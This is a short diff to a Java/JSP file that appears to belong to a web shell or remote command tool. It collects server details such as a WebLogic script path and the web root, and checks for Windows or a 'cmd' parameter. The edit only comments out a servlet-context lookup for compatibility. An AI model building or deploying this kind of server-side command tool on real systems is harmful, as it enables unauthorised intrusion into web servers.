@@ -41,13 +41,14 @@ if(null != s1 && null != s2)
     if(new java.io.File(szTmp).exists())
         szSys += "wlst=\"" + szTmp + "\"\n";
 }
-if(null != request.getServletContext())
-{
-    try{
-        String szKK = request.getServletContext().getResource("/").toString();
-        szSys += "curRealPath=\"" + szKK + "\"";
-    }catch(Exception e){}
-}
+//  javax.servlet-api >= 3.1
+// try{
+//     if(null != request.getServletContext())
+//     {    
+//         String szKK = request.getServletContext().getResource("/").toString();
+//         szSys += "curRealPath=\"" + szKK + "\"";
+//     }
+// }catch(Exception e){}
     
 
 if(-1 < szSys.indexOf("Windows") || null != cmd && -1 < cmd.indexOf("cmd"))
